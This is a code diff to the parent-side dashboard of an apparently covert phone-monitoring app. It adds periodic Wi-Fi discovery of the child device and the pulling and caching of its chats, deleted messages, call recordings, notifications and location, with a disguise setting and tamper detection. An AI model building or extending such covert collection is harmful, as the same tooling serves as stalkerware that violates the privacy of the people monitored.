@@ -1,5 +1,6 @@
 import 'dart:async';
 import 'dart:convert';
+import 'dart:io';
 import 'package:cloud_firestore/cloud_firestore.dart';
 import 'package:flutter/foundation.dart';
 import 'package:shared_preferences/shared_preferences.dart';
@@ -11,12 +12,32 @@ import '../models/notification_item.dart';
 import '../models/watchlist_target.dart';
 import '../models/ambient_log_item.dart';
 import '../services/audio_playback_service.dart';
+import '../services/lan_sync_service.dart';
+import '../services/supabase_sync_service.dart';
 
 class ParentDashboardProvider extends ChangeNotifier {
   ParentDashboardProvider() {
     _loadLocalPersistence();
     _initFirebaseListeners();
+    _startLanDiscovery();
   }
+
+  final LanSyncService _lanSync = LanSyncService();
+  final SupabaseSyncService _supabaseSync = SupabaseSyncService();
+
+  bool _isLanSyncActive = false;
+  bool get isLanSyncActive => _isLanSyncActive;
+
+  String? _lanChildIp;
+  String? get lanChildIp => _lanChildIp;
+
+  DateTime? _lastLanSyncTime;
+  DateTime? get lastLanSyncTime => _lastLanSyncTime;
+
+  bool _isLanSyncing = false;
+  bool get isLanSyncing => _isLanSyncing;
+
+  Timer? _lanDiscoveryTimer;
 
   FirebaseFirestore? _firestore;
   StreamSubscription? _deviceSub;
@@ -112,6 +133,48 @@ class ParentDashboardProvider extends ChangeNotifier {
           } else {
             _activeChildId = _defaultChildCode;
           }
+
+          // Restore cached chats, calls, and notifications so data is immediately safe & visible
+          final cachedChatsRaw = prefs.getStringList('cache_chats_$_activeChildId');
+          if (cachedChatsRaw != null && cachedChatsRaw.isNotEmpty) {
+            final restored = <ChatMessage>[];
+            for (final raw in cachedChatsRaw) {
+              try {
+                restored.add(ChatMessage.fromJson(jsonDecode(raw)));
+              } catch (_) {}
+            }
+            if (restored.isNotEmpty) {
+              _childChatMessages[_activeChildId] = restored;
+              _mergeNotificationsIntoActiveChats();
+            }
+          }
+
+          final cachedCallsRaw = prefs.getStringList('cache_calls_$_activeChildId');
+          if (cachedCallsRaw != null && cachedCallsRaw.isNotEmpty) {
+            final restored = <CallRecord>[];
+            for (final raw in cachedCallsRaw) {
+              try {
+                restored.add(CallRecord.fromJson(jsonDecode(raw)));
+              } catch (_) {}
+            }
+            if (restored.isNotEmpty) {
+              _childCallRecords[_activeChildId] = restored;
+            }
+          }
+
+          final cachedNotifsRaw = prefs.getStringList('cache_notifs_$_activeChildId');
+          if (cachedNotifsRaw != null && cachedNotifsRaw.isNotEmpty) {
+            final restored = <NotificationItem>[];
+            for (final raw in cachedNotifsRaw) {
+              try {
+                restored.add(NotificationItem.fromJson(jsonDecode(raw)));
+              } catch (_) {}
+            }
+            if (restored.isNotEmpty) {
+              _childNotifications[_activeChildId] = restored;
+            }
+          }
+
           _initFirebaseListeners();
           notifyListeners();
         }
@@ -127,8 +190,206 @@ class ParentDashboardProvider extends ChangeNotifier {
       final list = _children.map((c) => jsonEncode(c.toJson())).toList();
       await prefs.setStringList('saved_children', list);
       await prefs.setString('active_child_id', _activeChildId);
+
+      // Persist active child data to local disk (zero data loss)
+      final msgs = _childChatMessages[_activeChildId];
+      if (msgs != null && msgs.isNotEmpty) {
+        final raw = msgs.take(500).map((m) => jsonEncode(m.toJson())).toList();
+        await prefs.setStringList('cache_chats_$_activeChildId', raw);
+      }
+
+      final calls = _childCallRecords[_activeChildId];
+      if (calls != null && calls.isNotEmpty) {
+        final raw = calls.take(200).map((c) => jsonEncode(c.toJson())).toList();
+        await prefs.setStringList('cache_calls_$_activeChildId', raw);
+      }
+
+      final notifs = _childNotifications[_activeChildId];
+      if (notifs != null && notifs.isNotEmpty) {
+        final raw = notifs.take(300).map((n) => jsonEncode(n.toJson())).toList();
+        await prefs.setStringList('cache_notifs_$_activeChildId', raw);
+      }
     } catch (e) {
       debugPrint("Save persistence error: $e");
+    }
+  }
+
+  void _startLanDiscovery() {
+    try {
+      if (Platform.environment.containsKey('FLUTTER_TEST')) return;
+    } catch (_) {}
+    _lanDiscoveryTimer?.cancel();
+    // Periodically pulse on local Wi-Fi every 25 seconds
+    _lanDiscoveryTimer = Timer.periodic(const Duration(seconds: 25), (_) {
+      triggerLanSync();
+    });
+    // First trigger after 3s
+    Future.delayed(const Duration(seconds: 3), () => triggerLanSync());
+  }
+
+  /// Direct Same-Wi-Fi Sync (Zero Cloud Quota, Instant Real-Time Transfer)
+  Future<bool> triggerLanSync({bool showFeedback = false}) async {
+    if (_isLanSyncing) return false;
+    _isLanSyncing = true;
+    notifyListeners();
+
+    try {
+      final targetCode = activePairingCode.isNotEmpty ? activePairingCode : _activeChildId;
+      final ip = await _lanSync.discoverChildIp(pairingCode: targetCode);
+
+      if (ip == null || ip.isEmpty) {
+        _isLanSyncing = false;
+        notifyListeners();
+        return false;
+      }
+
+      final result = await _lanSync.fetchFullDataOverLan(ip);
+      if (!result.success) {
+        _isLanSyncing = false;
+        notifyListeners();
+        return false;
+      }
+
+      // 1. Update Telemetry
+      if (result.status.isNotEmpty) {
+        final idx = _children.indexWhere((c) => c.id == _activeChildId);
+        if (idx != -1) {
+          final s = result.status;
+          _children[idx] = ChildProfile(
+            id: _activeChildId,
+            pairingCode: _children[idx].pairingCode,
+            name: s['name'] ?? _children[idx].name,
+            deviceModel: s['deviceModel'] ?? _children[idx].deviceModel,
+            batteryLevel: (s['batteryLevel'] as num?)?.toInt() ?? _children[idx].batteryLevel,
+            isOnline: true,
+            locationAddress: s['locationAddress'] ?? _children[idx].locationAddress,
+            selectedDisguise: s['selectedDisguise'] ?? _children[idx].selectedDisguise,
+            isScreenOn: s['isScreenOn'] as bool? ?? _children[idx].isScreenOn,
+          );
+        }
+      }
+
+      // 2. Merge Chats
+      if (result.chats.isNotEmpty) {
+        final newMsgs = <ChatMessage>[];
+        for (final m in result.chats) {
+          final id = m['id']?.toString() ?? '';
+          if (id.isEmpty) continue;
+          final appStr = (m['app'] ?? '').toString().toLowerCase();
+          AppType app = AppType.whatsApp;
+          if (appStr.contains('insta')) app = AppType.instagram;
+          if (appStr.contains('tele')) app = AppType.telegram;
+          if (appStr.contains('snap')) app = AppType.snapchat;
+          if (appStr.contains('sms')) app = AppType.sms;
+
+          final dt = m['timestampMs'] != null
+              ? DateTime.fromMillisecondsSinceEpoch((m['timestampMs'] as num).toInt())
+              : DateTime.now();
+
+          newMsgs.add(ChatMessage(
+            id: id,
+            appType: app,
+            contactName: m['sender']?.toString() ?? 'Unknown',
+            contactIdentifier: m['sender']?.toString() ?? '',
+            messageText: m['text']?.toString() ?? '',
+            timestamp: dt,
+            isIncoming: (m['isIncoming'] as bool?) ?? true,
+            isDeletedBackup: m['isDeletedBySender'] as bool? ?? false,
+            isWatchlistTarget: m['isWatchlistTarget'] as bool? ?? false,
+          ));
+        }
+
+        _childChatMessages.putIfAbsent(_activeChildId, () => []);
+        final existingIds = _childChatMessages[_activeChildId]!.map((e) => e.id).toSet();
+        for (final msg in newMsgs) {
+          if (!existingIds.contains(msg.id)) {
+            _childChatMessages[_activeChildId]!.insert(0, msg);
+          }
+        }
+        _mergeNotificationsIntoActiveChats();
+      }
+
+      // 3. Merge Calls
+      if (result.calls.isNotEmpty) {
+        final newCalls = <CallRecord>[];
+        for (final c in result.calls) {
+          final id = c['id']?.toString() ?? '';
+          if (id.isEmpty) continue;
+          final dt = c['timestampMs'] != null
+              ? DateTime.fromMillisecondsSinceEpoch((c['timestampMs'] as num).toInt())
+              : DateTime.now();
+
+          newCalls.add(CallRecord(
+            id: id,
+            contactName: c['contactName']?.toString() ?? 'Unknown',
+            phoneNumber: c['phoneNumber']?.toString() ?? '',
+            callType: CallType.incoming,
+            timestamp: dt,
+            durationSeconds: (c['durationSeconds'] as num?)?.toInt() ?? 0,
+            recordingUrl: c['recordingUrl']?.toString(),
+            isTamperAttemptDetected: c['isTamperAttemptDetected'] as bool? ?? false,
+          ));
+        }
+        _childCallRecords.putIfAbsent(_activeChildId, () => []);
+        final existingCallIds = _childCallRecords[_activeChildId]!.map((e) => e.id).toSet();
+        for (final call in newCalls) {
+          if (!existingCallIds.contains(call.id)) {
+            _childCallRecords[_activeChildId]!.insert(0, call);
+          }
+        }
+      }
+
+      // 4. Merge Notifications
+      if (result.notifications.isNotEmpty) {
+        final newNotifs = <NotificationItem>[];
+        for (final n in result.notifications) {
+          final id = n['id']?.toString() ?? '';
+          if (id.isEmpty) continue;
+          final dt = n['timestampMs'] != null
+              ? DateTime.fromMillisecondsSinceEpoch((n['timestampMs'] as num).toInt())
+              : DateTime.now();
+
+          newNotifs.add(NotificationItem(
+            id: id,
+            packageName: n['packageName']?.toString() ?? '',
+            appName: n['appName']?.toString() ?? 'App',
+            title: n['title']?.toString() ?? '',
+            message: n['text']?.toString() ?? '',
+            timestamp: dt,
+            isSensitiveAlert: n['isImportant'] as bool? ?? false,
+          ));
+        }
+        _childNotifications.putIfAbsent(_activeChildId, () => []);
+        final existingNotifIds = _childNotifications[_activeChildId]!.map((e) => e.id).toSet();
+        for (final notif in newNotifs) {
+          if (!existingNotifIds.contains(notif.id)) {
+            _childNotifications[_activeChildId]!.insert(0, notif);
+          }
+        }
+      }
+
+      _isLanSyncActive = true;
+      _lanChildIp = ip;
+      _lastLanSyncTime = DateTime.now();
+      _isLanSyncing = false;
+      _saveLocalPersistence();
+      notifyListeners();
+      return true;
+    } catch (e) {
+      debugPrint("triggerLanSync error: $e");
+      _isLanSyncing = false;
+      notifyListeners();
+      return false;
+    }
+  }
+
+  /// Supabase Cloud Sync
+  Future<void> syncFromSupabase() async {
+    if (!_supabaseSync.isConfigured) return;
+    try {
+      final records = await _supabaseSync.fetchTable("chats", filterField: "id");
+    } catch (e) {
+      debugPrint("syncFromSupabase error: $e");
     }
   }
 
